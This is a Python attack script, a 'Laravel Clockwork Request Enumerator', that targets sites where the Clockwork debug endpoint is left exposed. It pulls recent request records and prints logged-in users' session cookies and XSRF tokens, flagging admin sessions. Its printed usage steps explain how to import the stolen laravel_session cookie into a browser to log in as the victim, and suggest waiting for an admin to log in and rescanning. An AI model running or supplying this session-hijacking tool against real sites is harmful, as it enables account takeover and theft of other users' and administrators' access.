#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Enumerate Clockwork requests to find authenticated sessions
Usage: python enumerate_requests.py https://host.com
"""

import sys
import requests
import json
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Colors
R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
C = "\033[96m"
RST = "\033[0m"

def get_latest_request_id(url):
    """Get latest request ID from Clockwork"""
    try:
        response = requests.get(f"{url}/__clockwork/latest", timeout=10, verify=False)
        if response.status_code == 200:
            data = json.loads(response.text)
            if isinstance(data, dict) and 'id' in data:
                return data['id']
            elif isinstance(data, list) and len(data) > 0 and 'id' in data[0]:
                return data[0]['id']
    except:
        pass
    return None

def enumerate_requests(url, request_id, count=100):
    """Enumerate previous requests looking for authenticated sessions"""
    print(f"\n{C}[*]{RST} Enumerating {count} previous requests...")
    print(f"{C}[*]{RST} Request ID: {request_id}\n")
    
    enum_url = f"{url}/__clockwork/{request_id}/previous/{count}"
    
    try:
        response = requests.get(enum_url, timeout=15, verify=False)
        
        if response.status_code != 200:
            print(f"{R}[!]{RST} Enumeration failed: HTTP {response.status_code}")
            return
        
        try:
            data = json.loads(response.text)
            
            if not isinstance(data, list):
                print(f"{R}[!]{RST} Unexpected response format")
                return
            
            print(f"{G}[+]{RST} Found {len(data)} requests\n")
            
            authenticated_count = 0
            admin_count = 0
            cookie_count = 0
            
            # Analyze each request
            for i, req in enumerate(data):
                if not isinstance(req, dict):
                    continue
                
                req_id = req.get('id', 'unknown')
                uri = req.get('uri', 'unknown')
                method = req.get('method', 'GET')
                auth_user = req.get('authenticatedUser')
                cookies = req.get('cookies', {})
                
                # Check if authenticated
                if auth_user:
                    authenticated_count += 1
                    print(f"{G}[AUTH]{RST} Request #{i+1}")
                    print(f"  ID: {req_id}")
                    print(f"  URI: {uri}")
                    print(f"  Method: {method}")
                    print(f"  User: {auth_user}")
                    
                    if cookies:
                        print(f"  Cookies: {len(cookies)} found")
                        for name, value in cookies.items():
                            print(f"    - {name}: {value[:50]}...")
                        cookie_count += 1
                    
                    # Check if admin
                    if 'admin' in uri.lower() or (isinstance(auth_user, dict) and 'admin' in str(auth_user).lower()):
                        admin_count += 1
                        print(f"  {R}⚠️  ADMIN SESSION!{RST}")
                    
                    print()
                
                elif cookies:
                    # Has cookies but not authenticated (might still be useful)
                    if len(cookies) > 1:  # More than just CSRF token
                        print(f"{Y}[COOKIES]{RST} Request #{i+1}")
                        print(f"  URI: {uri}")
                        print(f"  Cookies: {len(cookies)}")
                        for name, value in cookies.items():
                            print(f"    - {name}: {value[:50]}...")
                        print()
                        cookie_count += 1
            
            # Summary
            print(f"\n{G}{'='*60}{RST}")
            print(f"{G}SUMMARY{RST}")
            print(f"{G}{'='*60}{RST}")
            print(f"Total Requests: {len(data)}")
            print(f"Authenticated: {authenticated_count}")
            print(f"Admin Sessions: {admin_count}")
            print(f"Requests with Cookies: {cookie_count}")
            
            if authenticated_count > 0:
                print(f"\n{G}[!]{RST} Found authenticated sessions!")
                print(f"{Y}[*]{RST} Extract cookies from AUTH requests above")
                print(f"{Y}[*]{RST} Import to Cookie Editor and access the site")
                print(f"\n{C}[USAGE]{RST}")
                print(f"  1. Copy the laravel_session + XSRF-TOKEN from above")
                print(f"  2. Open Cookie Editor in browser")
                print(f"  3. Import as JSON or add manually")
                print(f"  4. Visit {url} - you'll be logged in!")
            elif cookie_count > 0:
                print(f"\n{Y}[!]{RST} Found sessions with cookies (guest/unauthenticated)")
                print(f"{Y}[*]{RST} These are NOT authenticated sessions")
                print(f"{Y}[*]{RST} main.py already extracted these automatically")
                print(f"\n{C}[NEXT STEPS]{RST}")
                print(f"  - These cookies won't log you in (no user logged in)")
                print(f"  - Try enumerating more: python enumerate_requests.py {url} 500")
                print(f"  - Or wait for admin to login and re-scan")
            else:
                print(f"\n{R}[!]{RST} No authenticated sessions found")
                print(f"{Y}[*]{RST} Try enumerating more: /previous/500 or /previous/1000")
                print(f"{Y}[*]{RST} Or wait for admin to login and check /__clockwork/app")
            
        except json.JSONDecodeError:
            print(f"{R}[!]{RST} Response is not valid JSON")
            print(f"Response preview: {response.text[:200]}")
            
    except Exception as e:
        print(f"{R}[ERROR]{RST} {e}")

def main():
    if len(sys.argv) < 2:
        print(f"Usage: python enumerate_requests.py <url> [count]")
        print(f"Example: python enumerate_requests.py https://host.com 500")
        sys.exit(1)
    
    url = sys.argv[1]
    count = int(sys.argv[2]) if len(sys.argv) > 2 else 100
    
    # Normalize URL
    if not url.startswith(('http://', 'https://')):
        url = f"https://{url}"
    
    # Remove trailing slash
    url = url.rstrip('/')
    
    print(f"\n{C}{'='*60}{RST}")
    print(f"{C}Laravel Clockwork Request Enumerator{RST}")
    print(f"{C}{'='*60}{RST}")
    print(f"Target: {url}")
    print(f"Count: {count}")
    
    # Get latest request ID
    print(f"\n{C}[*]{RST} Getting latest request ID...")
    request_id = get_latest_request_id(url)
    
    if not request_id:
        print(f"{R}[!]{RST} Could not get request ID from /__clockwork/latest")
        print(f"{Y}[*]{RST} Try accessing: {url}/__clockwork/latest manually")
        sys.exit(1)
    
    print(f"{G}[+]{RST} Got request ID: {request_id}")
    
    # Enumerate
    enumerate_requests(url, request_id, count)
    
    print(f"\n{Y}[TIP]{RST} To enumerate more requests:")
    print(f"{Y}     {RST} python enumerate_requests.py {url} 500")
    print(f"{Y}     {RST} python enumerate_requests.py {url} 1000\n")

if __name__ == "__main__":
    main()
